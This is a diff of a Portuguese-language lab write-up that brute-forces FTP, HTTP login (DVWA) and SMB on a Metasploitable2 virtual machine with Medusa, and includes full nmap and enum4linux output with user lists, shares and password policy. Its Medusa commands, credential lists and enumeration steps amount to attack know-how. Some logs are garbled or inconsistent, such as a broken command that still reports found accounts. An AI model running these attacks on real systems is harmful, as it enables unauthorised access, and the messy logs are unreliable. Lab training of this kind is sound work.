@@ -1,184 +1,533 @@
-Laboratório de Segurança - Simulação de Ataque de Brute Force com Medusa e Kali Linux
-====================================================================================
+Laboratório de Segurança - Simulação de Ataque de Força Bruta com Medusa e Kali Linux
 
 🎯 Objetivo
------------
-
 Simular um ataque de força bruta em serviços FTP, HTTP e SMB utilizando a ferramenta Medusa no Kali Linux contra uma máquina virtual Metasploitable2.
 
 🖥️ Ambiente de Teste
----------------------
+Máquina Atacante
+Sistema : Kali Linux
 
-### Máquina Atacante
+Ferramenta : Medusa v2.3
 
-*   **Sistema**: Kali Linux
-    
-*   **Ferramenta**: Medusa v2.3
-    
+Máquina Alvo (Vítima)
+Sistema : Metasploitable2
 
-### Máquina Alvo (Vítima)
+IP : 192.168.56.101
 
-*   **Sistema**: Metasploitable2
-    
-*   **IP**: 192.168.56.101
-    
-*   **Ambiente**: VirtualBox
-    
+Ambiente : VirtualBox
 
 🔍 Reconhecimento Inicial
--------------------------
+Teste de Conectividade
+festança
 
-### Teste de Conectividade
+Texto simples
+ 
+┌──(kali㉿kali)-[~]└─$ ping -c 2 192.168.56.101
+PING 192.168.56.101 (192.168.56.101) 56(84) bytes de dados.64 bytes de 192.168.56.101: icmp_seq=1 ttl=64 tempo=57,4 ms64 bytes de 192.168.56.101: icmp_seq=2 ttl=64 tempo=1,43 ms
 
-bash
+ --- 192.168.56.101 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1003ms
+rtt min/avg/max/mdev = 1.425/29.396/57.368/27.971 ms
 
-Plain Text
+Varredura de Portas e Serviços
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ ping -c 2 192.168.56.101PING 192.168.56.101 (192.168.56.101) 56(84) bytes de dados.64 bytes de 192.168.56.101: icmp_seq=1 ttl=64 tempo=57,4 ms64 bytes de 192.168.56.101: icmp_seq=2 ttl=64 tempo=1,43 ms--- Estatísticas de ping 192.168.56.101 ---2 pacotes transmitidos, 2 recebidos, 0% de perda de pacotes, tempo 1003 msrtt min/média/máx/desvio padrão = 1,425/29,396/57,368/27,971 ms   `
+Texto
+ 
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV -p 21,22,80,445,139 192.168.56.101
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 19:06 EDT
+Nmap scan report for 192.168.56.101
+Host is up (0.078s latency).
 
-### Varredura de Portas e Serviços
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+MAC Address: 08:00:27:DD:BD:B3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-bash
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.31 seconds
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.56.101
+Connected to 192.168.56.101.
+220 (vsFTPd 2.3.4)
+Name (192.168.56.101:kali): admin
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> quit
+221 Goodbye.
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$
 
-Plain Text
+Grupo de trabalho: WORKGROUP
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ nmap -sV -p 21,22,80,445,139 192.168.56.101   `
+⚔️ Ataque com Medusa - FTP
 
-**Resultado do Nmap:**
+MEDUSA:
 
-PortaEstadoServiçoVersão21/tcpabertoftpvsftpd 2.3.422/tcpabertosshOpenSSH 4.7p1 Debian 8ubuntu180/tcpabertohttpApache httpd 2.2.8 ((Ubuntu) DAV/2)139/tcpabertonetbios-ssnSamba smbd 3.X - 4.X445/tcpabertonetbios-ssnSamba smbd 3.X - 4.X
+┌──(kali㉿kali)-[~]
+└─$ echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt  
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ medusa -h 192.168.56.101 -u users.txt -p pass.txt -M ftp -t 6
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 
-**Grupo de trabalho:** WORKGROUP
+2025-10-12 19:55:38 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: users.txt (1 of 1, 0 complete) Password: pass.txt (1 of 1 complete)
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ medusa -h 192.168.56.101 -u users.txt -p pass.txt -M ftp -t 6
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 
-⚔️ Ataque de Força Bruta - FTP
-------------------------------
+2025-10-12 19:58:26 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: users.txt (1 of 1, 0 complete) Password: pass.txt (1 of 1 complete)
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ medusa -h 192.168.56.101 -u users.txt -p pass.txt -M ftp -t 6
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 
-### Teste Manual de Login FTP
+2025-10-12 20:03:02 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: users.txt (1 of 1, 0 complete) Password: pass.txt (1 of 1 complete)
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.56.101
+Connected to 192.168.56.101.
+220 (vsFTPd 2.3.4)
+Name (192.168.56.101:kali): admin
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> qui
+421 Timeout.
 
-bash
 
-Plain Text
+🌐 Teste de Acesso - HTTP (DVWA)
+Identificação do Alvo
+Endereço DVWA : http://192.168.56.101/dvwa/login.php
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ ftp 192.168.56.101Conectado a 192.168.56.101.220 (vsFTPd 2.3.4)Nome (192.168.56.101:kali): admin331 Por favor, especifique a senha.Senha: 530 Login incorreto.ftp: Login falhouftp> quit221 Adeus.   `
+MEDUSA:
 
-### Preparação de Listas de Credenciais
+──(kali㉿kali)-[~]
+└─$ echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt      
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
+                                                                             
 
-bash
+┌──(kali㉿kali)-[~]
+└─$ 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ echo -e 'user\nadmin\nmsfadmin\nadmin\nroot' > users.txt 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt      
+                                                                                                                                                          
+┌──(kali㉿kali)-[~]
+└─$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \     
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username-^USER^bpassord-^PASS^blogin-login' \
+-m 'FAIL-Login failed'-t 6
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 
-Plain Text
+2025-10-12 23:02:15 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 4, 0 complete) Password: password (1 of 4 complete)
+2025-10-12 23:02:15 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
+2025-10-12 23:02:15 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
+2025-10-12 23:02:15 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: password [SUCCESS]
+2025-10-12 23:02:15 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (3 of 4, 2 complete) Password: password (1 of 4 complete)
+2025-10-12 23:02:15 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: password [SUCCESS]
+2025-10-12 23:02:15 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: password (1 of 4 complete)
+2025-10-12 23:02:15 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: password [SUCCESS]
+-m: command not found
+-m: command not found
+-m: command not found
+                                                                             
+┌──(haikai)-[~]
+└─$
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ echo -e 'usuário\nmsfadmin\nadmin\nroot' > usuários.txt┌──(kali㉿kali)-[~]└─$ echo -e '123456\nsenha\nqwerty\nmsfadmin' > pass.txt   `
 
-### Ataque com Medusa - FTP
+  💻 Ataque de Força Bruta - PASWORD SPRAYING - SMB:
 
-bash
+                                                                            
+┌                                                                           
+┌──(kali㉿kali)-[~]
+└─$ enum4linux -a 192.168.56.101 | tee enum4_output.txt
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 12 23:28:07 2025
 
-Plain Text
+ =========================================( Target Information )=========================================
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ medusa -h 192.168.56.101 -u users.txt -p pass.txt -M ftp -t 6Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks jmk@foofus.net2025-10-12 19:55:38 VERIFICAÇÃO DE CONTA: [ftp] Host: 192.168.56.101 (1 de 1, 0 concluído) Usuário: users.txt (1 de 1, 0 concluído) Senha: pass.txt (1 de 1 concluído)   `
+Target ........... 192.168.56.101
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-🌐 Ataque de Força Bruta - HTTP (DVWA)
---------------------------------------
 
-### Identificação do Alvo
+ ===========================( Enumerating Workgroup/Domain on 192.168.56.101 )===========================
 
-*   **Endereço DVWA**: [http://192.168.56.101/dvwa/login.php](http://192.168.56.101/dvwa/login.php)
-    
 
-### Preparação de Listas
+[+] Got domain/workgroup name: WORKGROUP
 
-bash
 
-Plain Text
+ ===============================( Nbtstat Information for 192.168.56.101 )===============================
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ echo -e 'user\nadmin\nmsfadmin\nadmin\nroot' > users.txt┌──(kali㉿kali)-[~]└─$ echo -e 'usuário\nmsfadmin\nadmin\nroot' > usuários.txt   `
+Looking up status of 192.168.56.101
+        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
+        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
+        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
 
-### Ataque com Medusa - HTTP
+        MAC Address = 00-00-00-00-00-00
 
-bash
+ ==================================( Session Check on 192.168.56.101 )==================================                                                  
+                                                                             
+                                                                             
+[+] Server 192.168.56.101 allows sessions using username '', password ''     
+                                                                             
+                                                                             
+ ===============================( Getting domain SID for 192.168.56.101 )===============================                                                  
+                                                                             
+Domain Name: WORKGROUP                                                       
+Domain Sid: (NULL SID)
 
-Plain Text
+[+] Can't determine if host is part of domain or part of a workgroup         
+                                                                             
+                                                                             
+ ==================================( OS information on 192.168.56.101 )==================================                                                 
+                                                                             
+                                                                             
+[E] Can't get OS info with smbclient                                         
+                                                                             
+                                                                             
+[+] Got OS info for 192.168.56.101 from srvinfo:                             
+        METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)
+        platform_id     :       500
+        os version      :       4.9
+        server type     :       0x9a03
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \-m PAGE:'/dvwa/login.php' \-m FORM:'username-^USER^bpassord-^PASS^blogin-login' \-m 'FAIL-Login falhou' -t 6Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks jmk@foofus.net2025-10-12 23:02:15 VERIFICAÇÃO DE CONTA: [http] Host: 192.168.56.101 (1 de 1, 0 concluído) Usuário: admin (1 de 4, 0 concluído) Senha: password (1 de 4 concluído)2025-10-12 23:02:15 CONTA ENCONTRADA: [http] Host: 192.168.56.101 Usuário: admin Senha: password [SUCESSO]2025-10-12 23:02:15 VERIFICAÇÃO DE CONTA: [http] Host: 192.168.56.101 (1 de 1, 0 concluído) Usuário: msfadmin (2 de 4, 1 concluído) Senha: password (1 de 4 concluído)2025-10-12 23:02:15 CONTA ENCONTRADA: [http] Host: 192.168.56.101 Usuário: msfadmin Senha: password [SUCESSO]2025-10-12 23:02:15 VERIFICAÇÃO DE CONTA: [http] Host: 192.168.56.101 (1 de 1, 0 concluído) Usuário: user (3 de 4, 2 concluídos) Senha: password (1 de 4 concluídos)2025-10-12 23:02:15 CONTA ENCONTRADA: [http] Host: 192.168.56.101 Usuário: user Senha: password [SUCESSO]2025-10-12 23:02:15 VERIFICAÇÃO DE CONTA: [http] Host: 192.168.56.101 (1 de 1, 0 concluído) Usuário: root (4 de 4, 3 concluídos) Senha: password (1 de 4 concluídos)2025-10-12 23:02:15 CONTA ENCONTRADA: [http] Host: 192.168.56.101 Usuário: root Senha: password [SUCESSO]   `
 
-💻 Ataque de Força Bruta - SMB
-------------------------------
+ ======================================( Users on 192.168.56.101 )======================================                                                  
+                                                                             
+index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
+index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
+index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
+index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
+index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
+index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,,      Desc: (null)
+index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
+index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
+index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
+index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,    Desc: (null)
+index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
+index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
+index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
+index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
+index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
+index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
+index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
+index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
+index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
+index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,Desc: (null)
+index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)     Desc: (null)
+index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
+index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
+index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,    Desc: (null)
+index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
+index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
+index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
+index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
+index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
+index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager   Desc: (null)
+index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
+index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
+index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)Desc: (null)
+index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
+index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)
 
-### Enumeração com Enum4linux
+user:[games] rid:[0x3f2]
+user:[nobody] rid:[0x1f5]
+user:[bind] rid:[0x4ba]
+user:[proxy] rid:[0x402]
+user:[syslog] rid:[0x4b4]
+user:[user] rid:[0xbba]
+user:[www-data] rid:[0x42a]
+user:[root] rid:[0x3e8]
+user:[news] rid:[0x3fa]
+user:[postgres] rid:[0x4c0]
+user:[bin] rid:[0x3ec]
+user:[mail] rid:[0x3f8]
+user:[distccd] rid:[0x4c6]
+user:[proftpd] rid:[0x4ca]
+user:[dhcp] rid:[0x4b2]
+user:[daemon] rid:[0x3ea]
+user:[sshd] rid:[0x4b8]
+user:[man] rid:[0x3f4]
+user:[lp] rid:[0x3f6]
+user:[mysql] rid:[0x4c2]
+user:[gnats] rid:[0x43a]
+user:[libuuid] rid:[0x4b0]
+user:[backup] rid:[0x42c]
+user:[msfadmin] rid:[0xbb8]
+user:[telnetd] rid:[0x4c8]
+user:[sys] rid:[0x3ee]
+user:[klog] rid:[0x4b6]
+user:[postfix] rid:[0x4bc]
+user:[service] rid:[0xbbc]
+user:[list] rid:[0x434]
+user:[irc] rid:[0x436]
+user:[ftp] rid:[0x4be]
+user:[tomcat55] rid:[0x4c4]
+user:[sync] rid:[0x3f0]
+user:[uucp] rid:[0x3fc]
 
-bash
+ ================================( Share Enumeration on 192.168.56.101 )================================                                                  
+                                                                             
+                                                                             
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk      
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+Reconnecting with SMB1 for workgroup listing.
 
-Plain Text
+        Server               Comment
+        ---------            -------
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ enum4linux -a 192.168.56.101 | tee enum4_output.txt   `
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            METASPLOITABLE
 
-**Principais Descobertas:**
+[+] Attempting to map shares on 192.168.56.101                               
+                                                                             
+//192.168.56.101/print$ Mapping: DENIED Listing: N/A Writing: N/A            
+//192.168.56.101/tmp    Mapping: OK Listing: OK Writing: N/A
+//192.168.56.101/opt    Mapping: DENIED Listing: N/A Writing: N/A
 
-*   **Domínio/Grupo de trabalho**: WORKGROUP
-    
-*   **Nome do servidor**: METASPLOITABLE
-    
-*   **Samba**: 3.0.20-Debian
-    
+[E] Can't understand response:                                               
+                                                                             
+NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                   
+//192.168.56.101/IPC$   Mapping: N/A Listing: N/A Writing: N/A
+//192.168.56.101/ADMIN$ Mapping: DENIED Listing: N/A Writing: N/A
 
-**Compartilhamentos Encontrados:**
+ ===========================( Password Policy Information for 192.168.56.101 )===========================                                                 
+                                                                             
+                                                                             
 
-*   print$ - Printer Drivers
-    
-*   tmp - oh noes!
-    
-*   opt -
-    
-*   IPC$ - IPC Service
-    
-*   ADMIN$ - IPC Service
-    
+[+] Attaching to 192.168.56.101 using a NULL share
 
-**Política de Senhas:**
+[+] Trying protocol 139/SMB...
 
-*   Comprimento mínimo: 5 caracteres
-    
-*   Histórico de senhas: Nenhum
-    
-*   Idade máxima da senha: Não definida
-    
-*   Complexidade: Desativada
-    
+[+] Found domain(s):
 
-### Preparação de Listas SMB
+        [+] METASPLOITABLE
+        [+] Builtin
 
-bash
+[+] Password Info for Domain: METASPLOITABLE
 
-Plain Text
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: Not Set
+        [+] Password Complexity Flags: 000000
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ echo -e 'usuário\nmsfadmin\nserviço' > smb_users.txt┌──(kali㉿kali)-[~]└─$ echo -e 'senha\n123456\nwelcome123\nmsfadmin' > senhas_spray.txt   `
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
 
-### Ataque com Medusa - SMB
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: Not Set
 
-bash
 
-Plain Text
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ┌──(kali㉿kali)-[~]└─$ medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks jmk@foofus.net2025-10-13 00:11:44 CONTA ENCONTRADA: [smbnt] Host: 192.168.56.101 Usuário: msfadmin Senha: msfadmin [SUCESSO (ADMIN$ - Acesso permitido)]   `
+[+] Retieved partial password policy with rpcclient:                         
+                                                                             
+                                                                             
+Password Complexity: Disabled                                                
+Minimum Password Length: 0
 
-✅ Validação de Acesso
----------------------
 
-### Teste de Conexão SMB
+ ======================================( Groups on 192.168.56.101 )======================================                                                 
+                                                                             
+                                                                             
+[+] Getting builtin groups:                                                  
+                                                                             
+                                                                             
+[+]  Getting builtin group memberships:                                      
+                                                                             
+                                                                             
+[+]  Getting local groups:                                                   
+                                                                             
+                                                                             
+[+]  Getting local group memberships:                                        
+                                                                             
+                                                                             
+[+]  Getting domain groups:                                                  
+                                                                             
+                                                                             
+[+]  Getting domain group memberships:                                       
+                                                                             
+                                                                             
+ =================( Users on 192.168.56.101 via RID cycling (RIDS: 500-550,1000-1050) )=================                                                  
+                                                                             
+                                                                             
+[I] Found new SID:                                                           
+S-1-5-21-1042354039-2475377354-766472396                                     
 
-bash
+[+] Enumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''                                               
+                                                                             
+S-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)
+S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
+S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
+S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)
+S-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)
